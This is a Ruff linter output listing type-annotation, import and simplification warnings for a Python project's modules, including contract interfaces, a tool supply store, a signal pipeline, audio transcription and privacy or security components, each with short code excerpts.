  --> src\app\miniature_office\interfaces\contract.py:67:9
   |
65 |           """Check semantic versioning compatibility"""
66 |           # Breaking changes only on major version
67 | /         if self.major != other.major:
68 | |             return False
69 | |         # Minor and patch versions are backward compatible
70 | |         return True
   | |___________________^
71 |
72 |       def to_dict(self) -> Dict:
   |
help: Inline condition

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\interfaces\contract.py:72:26
   |
70 |         return True
71 |
72 |     def to_dict(self) -> Dict:
   |                          ^^^^
73 |         return {
74 |             "major": self.major,
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\interfaces\contract.py:98:20
    |
 96 |         self.provider_department_id = provider_department_id
 97 |         self.version = version
 98 |         self.apis: Dict[str, APIEndpoint] = {}
    |                    ^^^^
 99 |         self.failure_modes: List[FailureMode] = []
100 |         self.consumer_departments: List[str] = []
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\interfaces\contract.py:99:29
    |
 97 |         self.version = version
 98 |         self.apis: Dict[str, APIEndpoint] = {}
 99 |         self.failure_modes: List[FailureMode] = []
    |                             ^^^^
100 |         self.consumer_departments: List[str] = []
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\interfaces\contract.py:100:36
    |
 98 |         self.apis: Dict[str, APIEndpoint] = {}
 99 |         self.failure_modes: List[FailureMode] = []
100 |         self.consumer_departments: List[str] = []
    |                                    ^^^^
101 |
102 |         # Register contract
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\interfaces\contract.py:138:26
    |
136 |         return self.version.is_compatible_with(other.version)
137 |
138 |     def to_dict(self) -> Dict:
    |                          ^^^^
139 |         base = super().to_dict()
140 |         base.update(
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\interfaces\contract.py:165:12
    |
163 |     timestamp: datetime = field(default_factory=datetime.utcnow)
164 |     success: bool = True
165 |     error: Optional[str] = None
    |            ^^^^^^^^^^^^^
166 |     latency_ms: float = 0.0
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\interfaces\contract.py:168:26
    |
166 |     latency_ms: float = 0.0
167 |
168 |     def to_dict(self) -> Dict:
    |                          ^^^^
169 |         return {
170 |             "invocation_id": self.invocation_id,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\interfaces\contract.py:189:25
    |
188 |     def __init__(self):
189 |         self.contracts: Dict[str, Contract] = {}
    |                         ^^^^
190 |         self.invocations: List[InvocationRecord] = []
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\interfaces\contract.py:190:27
    |
188 |     def __init__(self):
189 |         self.contracts: Dict[str, Contract] = {}
190 |         self.invocations: List[InvocationRecord] = []
    |                           ^^^^
191 |
192 |     def register_contract(self, contract: Contract):
    |
help: Replace with `list`

SIM103 Return the negated condition directly
   --> src\app\miniature_office\interfaces\contract.py:218:9
    |
216 |           # Check if consumer department exists
217 |           consumer = get_registry().get(consumer_department_id)
218 | /         if not consumer:
219 | |             return False
220 | |
221 | |         # Additional compatibility checks can be added here
222 | |         # (e.g., capability matching, security clearance)
223 | |
224 | |         return True
    | |___________________^
225 |
226 |       def invoke_contract(
    |
help: Inline condition

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\interfaces\contract.py:231:21
    |
229 |         contract_id: str,
230 |         api_path: str,
231 |         parameters: Optional[Dict] = None,
    |                     ^^^^^^^^^^^^^^
232 |     ) -> InvocationRecord:
233 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\interfaces\contract.py:231:30
    |
229 |         contract_id: str,
230 |         api_path: str,
231 |         parameters: Optional[Dict] = None,
    |                              ^^^^
232 |     ) -> InvocationRecord:
233 |         """
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\interfaces\contract.py:304:57
    |
302 |         return record
303 |
304 |     def get_contract_metrics(self, contract_id: str) -> Dict:
    |                                                         ^^^^
305 |         """Get metrics for a contract"""
306 |         relevant_invocations = [
    |
help: Replace with `dict`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\miniature_office\meta_security_dept.py:237:9
    |
236 |           # Auto-escalate based on severity
237 | /         if violation.severity >= EnforcementLevel.CONTAINMENT:
238 | |             if violation.component_id:
    | |______________________________________^
239 |                   self.contain(violation.component_id, reason=violation.description)
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\miniature_office\repair_crew.py:284:13
    |
282 |                   )
283 |               # Check for hardcoded secrets patterns
284 | /             if any(
285 | |                 kw in stripped.lower() for kw in ("password=", "secret=", "api_key=")
286 | |             ):
287 | |                 if "os.environ" not in stripped and "getenv" not in stripped:
    | |_____________________________________________________________________________^
288 |                       issues.append(
289 |                           DiagnosticIssue(
    |
help: Combine `if` statements using `and`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\server\app.py:75:13
   |
74 | # Global simulation instance
75 | simulation: Optional[SimulationEngine] = None
   |             ^^^^^^^^^^^^^^^^^^^^^^^^^^
   |
help: Convert to `X | None`

UP035 [*] Import from `collections.abc` instead: `Callable`
 --> src\app\miniature_office\server\security.py:7:1
  |
5 | import os
6 | from functools import wraps
7 | from typing import Callable
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 |
9 | from flask import jsonify, request
  |
help: Import from `collections.abc`

SIM102 Use a single `if` statement instead of nested `if` statements
  --> src\app\miniature_office\server\security.py:60:9
   |
58 |       @wraps(f)
59 |       def wrapper(*args, **kwargs):
60 | /         if request.method in ["POST", "PUT", "PATCH"]:
61 | |             if not request.is_json:
   | |___________________________________^
62 |                   return jsonify({"error": "Content-Type must be application/json"}), 415
63 |           return f(*args, **kwargs)
   |
help: Combine `if` statements using `and`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\tools\supply_store.py:10:1
   |
 8 | from datetime import datetime
 9 | from enum import Enum
10 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
11 |
12 | from app.miniature_office.core.audit import EventType, get_audit_log
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\tools\supply_store.py:10:1
   |
 8 | from datetime import datetime
 9 | from enum import Enum
10 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
11 |
12 | from app.miniature_office.core.audit import EventType, get_audit_log
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> src\app\miniature_office\tools\supply_store.py:10:1
   |
 8 | from datetime import datetime
 9 | from enum import Enum
10 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
11 |
12 | from app.miniature_office.core.audit import EventType, get_audit_log
   |

UP006 [*] Use `set` instead of `Set` for type annotation
  --> src\app\miniature_office\tools\supply_store.py:45:19
   |
43 |     trust_score: float = 0.5  # 0.0 - 1.0
44 |     security_rating: int = 3  # 1-5, where 5 is most secure
45 |     capabilities: Set[str] = field(default_factory=set)
   |                   ^^^
46 |     requires_justification: bool = False
   |
help: Replace with `set`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\tools\supply_store.py:48:26
   |
46 |     requires_justification: bool = False
47 |
48 |     def to_dict(self) -> Dict:
   |                          ^^^^
49 |         return {
50 |             "tag": self.tag.value,
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\tools\supply_store.py:67:30
   |
65 |         super().__init__(tool_id, EntityType.TOOL, name)
66 |         self.metadata_info = metadata
67 |         self.checked_out_by: Optional[str] = None  # Agent ID
   |                              ^^^^^^^^^^^^^
68 |         self.checkout_history: List[Dict] = []
69 |         self.is_available = True
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\tools\supply_store.py:68:32
   |
66 |         self.metadata_info = metadata
67 |         self.checked_out_by: Optional[str] = None  # Agent ID
68 |         self.checkout_history: List[Dict] = []
   |                                ^^^^
69 |         self.is_available = True
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\tools\supply_store.py:68:37
   |
66 |         self.metadata_info = metadata
67 |         self.checked_out_by: Optional[str] = None  # Agent ID
68 |         self.checkout_history: List[Dict] = []
   |                                     ^^^^
69 |         self.is_available = True
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\tools\supply_store.py:81:26
   |
79 |         )
80 |
81 |     def to_dict(self) -> Dict:
   |                          ^^^^
82 |         base = super().to_dict()
83 |         base.update(
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\tools\supply_store.py:102:20
    |
100 |     justification: str = ""
101 |     checked_out_at: datetime = field(default_factory=datetime.utcnow)
102 |     checked_in_at: Optional[datetime] = None
    |                    ^^^^^^^^^^^^^^^^^^
103 |
104 |     def to_dict(self) -> Dict:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\tools\supply_store.py:104:26
    |
102 |     checked_in_at: Optional[datetime] = None
103 |
104 |     def to_dict(self) -> Dict:
    |                          ^^^^
105 |         return {
106 |             "checkout_id": self.checkout_id,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\tools\supply_store.py:124:21
    |
123 |     def __init__(self):
124 |         self.tools: Dict[str, Tool] = {}
    |                     ^^^^
125 |         self.checkouts: Dict[str, CheckoutRecord] = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\tools\supply_store.py:125:25
    |
123 |     def __init__(self):
124 |         self.tools: Dict[str, Tool] = {}
125 |         self.checkouts: Dict[str, CheckoutRecord] = {}
    |                         ^^^^
126 |
127 |     def add_tool(self, tool: Tool):
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\tools\supply_store.py:139:10
    |
137 |     def check_out_tool(
138 |         self, tool_id: str, agent_id: str, justification: str = ""
139 |     ) -> Optional[CheckoutRecord]:
    |          ^^^^^^^^^^^^^^^^^^^^^^^^
140 |         """
141 |         Check out a tool (Codex 5.2).
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\tools\supply_store.py:207:38
    |
205 |         return True
206 |
207 |     def get_available_tools(self) -> List[Tool]:
    |                                      ^^^^
208 |         """Get all available tools"""
209 |         return [t for t in self.tools.values() if t.is_available]
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\tools\supply_store.py:211:49
    |
209 |         return [t for t in self.tools.values() if t.is_available]
210 |
211 |     def get_tools_by_tag(self, tag: ToolTag) -> List[Tool]:
    |                                                 ^^^^
212 |         """Get all tools with a specific tag"""
213 |         return [t for t in self.tools.values() if t.metadata_info.tag == tag]
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\tools\supply_store.py:215:59
    |
213 |         return [t for t in self.tools.values() if t.metadata_info.tag == tag]
214 |
215 |     def get_tools_by_capability(self, capability: str) -> List[Tool]:
    |                                                           ^^^^
216 |         """Get all tools that provide a specific capability"""
217 |         return [
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\tools\supply_store.py:221:53
    |
219 |         ]
220 |
221 |     def get_agent_checkouts(self, agent_id: str) -> List[CheckoutRecord]:
    |                                                     ^^^^
222 |         """Get all active checkouts for an agent"""
223 |         return [
    |
help: Replace with `list`

F401 [*] `hashlib` imported but unused
  --> src\app\pipeline\signal_flows.py:29:8
   |
27 | """
28 |
29 | import hashlib
   |        ^^^^^^^
30 | import json
31 | import logging
   |
help: Remove unused import: `hashlib`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\pipeline\signal_flows.py:39:1
   |
37 | from collections import defaultdict
38 | from datetime import datetime
39 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
40 |
41 | # Try to import Redis, fallback to None if unavailable
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\pipeline\signal_flows.py:39:1
   |
37 | from collections import defaultdict
38 | from datetime import datetime
39 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
40 |
41 | # Try to import Redis, fallback to None if unavailable
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> src\app\pipeline\signal_flows.py:39:1
   |
37 | from collections import defaultdict
38 | from datetime import datetime
39 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
40 |
41 | # Try to import Redis, fallback to None if unavailable
   |

F401 [*] `typing.Tuple` imported but unused
  --> src\app\pipeline\signal_flows.py:39:47
   |
37 | from collections import defaultdict
38 | from datetime import datetime
39 | from typing import Any, Dict, List, Optional, Tuple
   |                                               ^^^^^
40 |
41 | # Try to import Redis, fallback to None if unavailable
   |
help: Remove unused import: `typing.Tuple`

F841 [*] Local variable `e` is assigned to but never used
   --> src\app\pipeline\signal_flows.py:172:29
    |
170 |             return result
171 |
172 |         except Exception as e:
    |                             ^
173 |             with self.lock:
174 |                 self.failure_count += 1
    |
help: Remove assignment to unused variable `e`

UP045 [*] Use `X | None` for type annotations
   --> src\app\pipeline\signal_flows.py:356:22
    |
356 | def redact_pii(text: Optional[str], redactors: Optional[List[str]] = None) -> str:
    |                      ^^^^^^^^^^^^^
357 |     """
358 |     Comprehensive PII redaction pipeline.
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\pipeline\signal_flows.py:356:48
    |
356 | def redact_pii(text: Optional[str], redactors: Optional[List[str]] = None) -> str:
    |                                                ^^^^^^^^^^^^^^^^^^^
357 |     """
358 |     Comprehensive PII redaction pipeline.
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\pipeline\signal_flows.py:356:57
    |
356 | def redact_pii(text: Optional[str], redactors: Optional[List[str]] = None) -> str:
    |                                                         ^^^^
357 |     """
358 |     Comprehensive PII redaction pipeline.
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\pipeline\signal_flows.py:396:29
    |
396 | def validate_signal(signal: Dict[str, Any]) -> Dict[str, Any]:
    |                             ^^^^
397 |     """
398 |     Validate signal using schema validation.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\pipeline\signal_flows.py:396:48
    |
396 | def validate_signal(signal: Dict[str, Any]) -> Dict[str, Any]:
    |                                                ^^^^
397 |     """
398 |     Validate signal using schema validation.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\pipeline\signal_flows.py:440:28
    |
440 | def process_signal(signal: Dict[str, Any], is_incident: bool = False) -> Dict[str, Any]:
    |                            ^^^^
441 |     """
442 |     Process signal through complete pipeline.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\pipeline\signal_flows.py:440:74
    |
440 | def process_signal(signal: Dict[str, Any], is_incident: bool = False) -> Dict[str, Any]:
    |                                                                          ^^^^
441 |     """
442 |     Process signal through complete pipeline.
    |
help: Replace with `dict`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\pipeline\signal_flows.py:533:9
    |
532 |           # Step 2: Media transcription (if applicable)
533 | /         if signal.get("media_type") in ("audio", "video") and signal.get("asset_path"):
534 | |             if enable_transcript:
    | |_________________________________^
535 |                   try:
536 |                       # Import transcription plugin
    |
help: Combine `if` statements using `and`

B023 Function definition does not bind loop variable `attempt`
   --> src\app\pipeline\signal_flows.py:642:29
    |
640 |                     if (
641 |                         signal.get("simulate") == "retry"
642 |                         and attempt < MAX_RETRIES_PER_SIGNAL
    |                             ^^^^^^^
643 |                     ):
644 |                         raise RuntimeError("Simulated retry error")
    |

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\pipeline\signal_flows.py:753:14
    |
752 | def process_batch(
753 |     signals: List[Dict[str, Any]], is_incident: bool = False
    |              ^^^^
754 | ) -> List[Dict[str, Any]]:
755 |     """
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\pipeline\signal_flows.py:753:19
    |
752 | def process_batch(
753 |     signals: List[Dict[str, Any]], is_incident: bool = False
    |                   ^^^^
754 | ) -> List[Dict[str, Any]]:
755 |     """
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\pipeline\signal_flows.py:754:6
    |
752 | def process_batch(
753 |     signals: List[Dict[str, Any]], is_incident: bool = False
754 | ) -> List[Dict[str, Any]]:
    |      ^^^^
755 |     """
756 |     Process a batch of signals.
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\pipeline\signal_flows.py:754:11
    |
752 | def process_batch(
753 |     signals: List[Dict[str, Any]], is_incident: bool = False
754 | ) -> List[Dict[str, Any]]:
    |           ^^^^
755 |     """
756 |     Process a batch of signals.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\pipeline\signal_flows.py:774:29
    |
774 | def get_pipeline_stats() -> Dict[str, Any]:
    |                             ^^^^
775 |     """
776 |     Get pipeline statistics.
    |
help: Replace with `dict`

F401 [*] `os` imported but unused
  --> src\app\plugins\ttp_audio_processing.py:20:8
   |
18 | import hashlib
19 | import logging
20 | import os
   |        ^^
21 | from pathlib import Path
22 | from typing import Any, Dict, Optional, Tuple
   |
help: Remove unused import: `os`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\plugins\ttp_audio_processing.py:22:1
   |
20 | import os
21 | from pathlib import Path
22 | from typing import Any, Dict, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> src\app\plugins\ttp_audio_processing.py:22:1
   |
20 | import os
21 | from pathlib import Path
22 | from typing import Any, Dict, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
  --> src\app\plugins\ttp_audio_processing.py:27:46
   |
27 | def redact_pii_from_transcript(text: str) -> Tuple[str, Dict[str, int]]:
   |                                              ^^^^^
28 |     """
29 |     Redact personally identifiable information from transcript.
   |
help: Replace with `tuple`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\plugins\ttp_audio_processing.py:27:57
   |
27 | def redact_pii_from_transcript(text: str) -> Tuple[str, Dict[str, int]]:
   |                                                         ^^^^
28 |     """
29 |     Redact personally identifiable information from transcript.
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\plugins\ttp_audio_processing.py:75:35
   |
75 | def check_audio_dependencies() -> Dict[str, bool]:
   |                                   ^^^^
76 |     """
77 |     Check availability of audio processing dependencies.
   |
help: Replace with `dict`

F401 `whisper` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> src\app\plugins\ttp_audio_processing.py:85:16
   |
84 |     try:
85 |         import whisper
   |                ^^^^^^^
86 |
87 |         deps["whisper"] = True
   |
help: Remove unused import: `whisper`

F401 `pydub` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> src\app\plugins\ttp_audio_processing.py:92:16
   |
91 |     try:
92 |         import pydub
   |                ^^^^^
93 |
94 |         deps["pydub"] = True
   |
help: Remove unused import: `pydub`

F401 `numpy` imported but unused; consider using `importlib.util.find_spec` to test for availability
   --> src\app\plugins\ttp_audio_processing.py:99:16
    |
 98 |     try:
 99 |         import numpy
    |                ^^^^^
100 |
101 |         deps["numpy"] = True
    |
help: Remove unused import: `numpy`

F401 `librosa` imported but unused; consider using `importlib.util.find_spec` to test for availability
   --> src\app\plugins\ttp_audio_processing.py:106:16
    |
105 |     try:
106 |         import librosa
    |                ^^^^^^^
107 |
108 |         deps["librosa"] = True
    |
help: Remove unused import: `librosa`

UP045 [*] Use `X | None` for type annotations
   --> src\app\plugins\ttp_audio_processing.py:119:15
    |
117 |     aggregator=None,
118 |     model_size: str = "base",
119 |     language: Optional[str] = None,
    |               ^^^^^^^^^^^^^
120 |     redact_pii: bool = True,
121 | ) -> Dict[str, Any]:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\plugins\ttp_audio_processing.py:121:6
    |
119 |     language: Optional[str] = None,
120 |     redact_pii: bool = True,
121 | ) -> Dict[str, Any]:
    |      ^^^^
122 |     """
123 |     Transcribe audio file with PII redaction.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\plugins\ttp_audio_processing.py:253:47
    |
253 | def analyze_audio_quality(audio_path: str) -> Dict[str, Any]:
    |                                               ^^^^
254 |     """
255 |     Analyze audio quality metrics.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\plugins\ttp_audio_processing.py:301:30
    |
301 | def get_ttp_audio_stats() -> Dict[str, Any]:
    |                              ^^^^
302 |     """
303 |     Get TTP audio processing statistics.
    |
help: Replace with `dict`

SIM103 Return the negated condition directly
   --> src\app\privacy\anti_tracker.py:111:9
    |
109 |               True if blocked
110 |           """
111 | /         if not self._active:
112 | |             return False
113 | |
114 | |         # Block ETag tracking
115 | |         return True
    | |___________________^
116 |
117 |       def get_statistics(self) -> dict[str, Any]:
    |
help: Inline condition

F401 [*] `time` imported but unused
  --> src\app\resilience\deadman_switch.py:19:8
   |
17 | import logging
18 | import threading
19 | import time
   |        ^^^^
20 | from collections.abc import Callable
21 | from datetime import datetime, timedelta
   |
help: Remove unused import: `time`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> src\app\security\advanced\dos_trap.py:1394:13
     |
1392 |                       )
1393 |
1394 | /             elif action == ResponseAction.SHUTDOWN:
1395 | |                 if self.config["emergency_shutdown"]:
     | |_____________________________________________________^
1396 |                       self._emergency_shutdown()
     |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\security\advanced\hardware_root_of_trust.py:556:9
    |
555 |           # Try preferred type first
556 | /         if self.preferred_type:
557 | |             if self._try_initialize_type(self.preferred_type):
    | |______________________________________________________________^
558 |                   return True
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\security\advanced\microvm_isolation.py:487:13
    |
486 |               # Try to connect via communication channel
487 | /             if self._channel.connect(timeout=1.0):
488 | |                 # Send ping message
489 | |                 if self._channel.send_message({"type": "ping"}):
    | |________________________________________________________________^
490 |                       response = self._channel.receive_message(timeout=1.0)
491 |                       if response and response.get("type") == "pong":
    |
help: Combine `if` statements using `and`

SIM101 Multiple `isinstance` calls for expression, merge into a single call
   --> src\app\security\advanced\privacy_ledger.py:131:12
    |
129 |           if isinstance(data.get("event_type"), str):
130 |               data["event_type"] = EventType(data["event_type"])
131 |           if isinstance(data.get("severity"), str) or isinstance(
    |  ____________^
132 | |             data.get("severity"), int
133 | |         ):
    | |_________^
134 |               severity_val = data["severity"]
135 |               data["severity"] = (
    |
help: Merge `isinstance` calls

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\security\advanced\privacy_ledger.py:488:17
    |
486 |             except Exception as e:
487 |                 self.logger.error("Atomic append failed: %s", e)
488 |                 raise RuntimeError(f"Failed to append entry atomically: {e}")
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
489 |
490 |     def _serialize_entry(self, entry: LedgerEntry) -> bytes:
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\security\advanced\privacy_ledger.py:536:13
    |
534 |         except Exception as e:
535 |             self.logger.error("Entry deserialization failed: %s", e)
536 |             raise ValueError(f"Failed to deserialize entry: {e}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
537 |
538 |     def _encrypt_field(self, value: str) -> str:
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\security\advanced\privacy_risk_engine.py:203:9
    |
202 |           # Check for known threat patterns
203 | /         if event_type == "auth_failure":
204 | |             if self._metrics["failed_auth_attempts"] > 5:
    | |_________________________________________________________^
205 |                   return ThreatEvent(
206 |                       timestamp=time.time(),
    |
help: Combine `if` statements using `and`

N818 Exception name `SecurityViolationException` should be named with an Error suffix
   --> src\app\security\asymmetric_enforcement_gateway.py:239:7
    |
239 | class SecurityViolationException(Exception):
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^^
240 |     """
241 |     Exception raised when operation is blocked by security gateway.
    |

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\security\pii_redaction_enhanced.py:11:1
   |
 9 | import logging
10 | import re
11 | from typing import Dict, List, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
12 |
13 | logger = logging.getLogger(__name__)
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\security\pii_redaction_enhanced.py:11:1
   |
 9 | import logging
10 | import re
11 | from typing import Dict, List, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
12 |
13 | logger = logging.getLogger(__name__)
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> src\app\security\pii_redaction_enhanced.py:11:1
   |
 9 | import logging
10 | import re
11 | from typing import Dict, List, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
12 |
13 | logger = logging.getLogger(__name__)
   |

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\security\pii_redaction_enhanced.py:176:34
    |
175 | def redact_pii_comprehensive(
176 |     text: str, enabled_patterns: List[str] = None, preserve_hashes: bool = True
    |                                  ^^^^
177 | ) -> Tuple[str, Dict[str, any]]:
178 |     """
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\security\pii_redaction_enhanced.py:177:6
    |
175 | def redact_pii_comprehensive(
176 |     text: str, enabled_patterns: List[str] = None, preserve_hashes: bool = True
177 | ) -> Tuple[str, Dict[str, any]]:
    |      ^^^^^
178 |     """
179 |     Comprehensive PII redaction with all pattern types.
    |
help: Replace with `tuple`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\security\pii_redaction_enhanced.py:177:17
    |
175 | def redact_pii_comprehensive(
176 |     text: str, enabled_patterns: List[str] = None, preserve_hashes: bool = True
177 | ) -> Tuple[str, Dict[str, any]]:
    |                 ^^^^
178 |     """
179 |     Comprehensive PII redaction with all pattern types.
    |
help: Replace with `dict`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\security\pii_redaction_enhanced.py:229:17
    |
228 |                   # Luhn check for credit cards
229 | /                 if pattern_config.get("luhn_check"):
230 | |                     if not luhn_check(matched_text):
    | |____________________________________________________^
231 |                           continue
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\security\pii_redaction_enhanced.py:234:17
    |
233 |                   # IP address exclusion
234 | /                 if pattern_config.get("exclude_ranges"):
235 | |                     # Skip private IP ranges (simplified)
236 | |                     if matched_text.startswith(("127.", "10.", "192.168.")):
    | |____________________________________________________________________________^
237 |                           continue
    |
help: Combine `if` statements using `and`

N801 Class name `TSECA_Ghost_System` should use CapWords convention
   --> src\app\security\tseca_ghost_protocol.py:477:7
    |
477 | class TSECA_Ghost_System:
    |       ^^^^^^^^^^^^^^^^^^
478 |     """Unified runtime hardening + catastrophic continuity system.
    |

F401 [*] `asyncio` imported but unused
  --> src\app\testing\anti_sovereign_stress_tests.py:30:8
   |
28 | from __future__ import annotations
29 |
30 | import asyncio
   |        ^^^^^^^
31 | import hashlib
32 | import json
   |
help: Remove unused import: `asyncio`

F401 [*] `hashlib` imported but unused
  --> src\app\testing\anti_sovereign_stress_tests.py:31:8
   |
30 | import asyncio
31 | import hashlib
   |        ^^^^^^^
32 | import json
33 | import logging
   |
help: Remove unused import: `hashlib`

F401 [*] `pathlib.Path` imported but unused
  --> src\app\testing\conversational_stress_orchestrator.py:27:21
   |
25 | from dataclasses import asdict, dataclass
26 | from datetime import UTC, datetime
27 | from pathlib import Path
   |                     ^^^^
28 | from typing import Any
   |
help: Remove unused import: `pathlib.Path`

UP041 [*] Replace aliased errors with `TimeoutError`
   --> src\app\testing\conversational_stress_orchestrator.py:401:16
    |
399 |             }
400 |
401 |         except asyncio.TimeoutError:
    |                ^^^^^^^^^^^^^^^^^^^^
402 |             logger.error("Test %s timed out", test.test_id)
403 |             progress.status = "timeout"
    |
help: Replace `asyncio.TimeoutError` with builtin `TimeoutError`

